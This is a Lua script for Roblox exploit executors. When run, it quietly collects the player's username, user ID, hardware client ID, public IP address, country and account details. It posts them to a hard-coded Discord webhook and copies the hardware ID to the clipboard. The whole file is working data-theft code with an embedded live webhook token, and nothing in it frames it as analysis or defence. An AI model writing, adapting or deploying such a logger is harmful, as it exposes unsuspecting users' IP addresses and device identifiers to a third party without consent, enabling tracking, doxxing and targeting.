local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local RbxAnalytics = game:GetService("RbxAnalyticsService")

local plr = Players.LocalPlayer
local premium = plr.MembershipType == Enum.MembershipType.Premium
local ALT = plr.AccountAge <= 15
local info = MarketplaceService:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)

local hwid = "Unknown"
pcall(function()
    hwid = RbxAnalytics:GetClientId()
end)

local IP, country = "Unknown", "Unknown"
pcall(function()
    IP = game:HttpGet("https://v4.ident.me", true)
end)
pcall(function()
    local res = game:HttpGet("https://httpbin.org/get")
    local headers = HttpService:JSONDecode(res).headers
    country = headers["X-Country-Code"] or "Unknown"
end)

local webhook_url = "https://discord.com/api/webhooks/1373678519632134184/6jgZrjN1R7vr3nzdV-iB_828vM5_EsSkUeVittNCDEOhlLzXnhvLgjiX3BYpDk7KBCQ6"

local data = {
    ["content"] = "Скрипт запущен",
    ["embeds"] = {{
        ["title"] = "**Информация о запуске скрипта**",
        ["color"] = tonumber(0x33FF5C),
        ["fields"] = {
            {["name"] = "Username", ["value"] = plr.Name, ["inline"] = true},
            {["name"] = "Display Name", ["value"] = plr.DisplayName, ["inline"] = true},
            {["name"] = "User ID", ["value"] = tostring(plr.UserId), ["inline"] = true},
            {["name"] = "IP Address", ["value"] = IP, ["inline"] = true},
            {["name"] = "HWID (ClientId)", ["value"] = hwid, ["inline"] = true},
            {["name"] = "Game Link", ["value"] = "https://roblox.com/games/" .. game.PlaceId, ["inline"] = true},
            {["name"] = "Game Name", ["value"] = info.Name, ["inline"] = true},
            {["name"] = "Country", ["value"] = country, ["inline"] = true},
            {["name"] = "Account Age", ["value"] = tostring(plr.AccountAge), ["inline"] = true},
            {["name"] = "Premium", ["value"] = tostring(premium), ["inline"] = true},
            {["name"] = "ALT", ["value"] = tostring(ALT), ["inline"] = true}
        }
    }}
}

local http_request = http_request or (syn and syn.request) or (http and http.request) or request
if http_request then
    pcall(function()
        http_request({
            Url = webhook_url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

pcall(function()
    if setclipboard then setclipboard(hwid) end
end)
